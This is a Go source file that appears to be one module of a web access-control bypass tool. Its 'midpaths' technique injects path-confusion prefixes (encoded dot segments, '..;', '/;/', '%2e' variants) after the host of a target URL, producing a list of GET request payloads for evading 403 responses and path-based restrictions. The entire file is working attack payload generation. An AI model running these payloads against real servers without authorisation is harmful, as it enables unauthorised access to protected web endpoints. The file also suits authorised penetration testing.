package techniques

func (MidPaths) Name() string { return "midpaths" }

type MidPaths struct{}

func (MidPaths) Generate(ctx Context) []Payload {
    prefixes := []string{
        "/%2e/", "/%2e%2e/", "/%252e/", "/..;/", "/.;/", "/;/", "//;//",
        "/*/", "/./", "/././", "/~/", "/-/", "/%20/", "/%09/",
    }
    var out []Payload
    // Inject prefix between scheme+host and path
    for _, p := range prefixes {
        // Simple: prepend to full URL after host
        // Assume URL form http(s)://host/path
        idx := 0
        for i := 0; i < len(ctx.Target); i++ {
            if i > 8 && ctx.Target[i] == '/' && ctx.Target[i-1] != '/' {
                idx = i
                break
            }
        }
        var newURL string
        if idx > 0 {
            newURL = ctx.Target[:idx] + p + ctx.Target[idx+1:]
        } else {
            newURL = ctx.Target + p
        }
        out = append(out, Payload{
            Method:      "GET",
            URL:         newURL,
            Description: "Prefix: " + p,
            Detail:      p + ctx.Target,
            Technique:   "midpaths",
        })
    }
    return out
}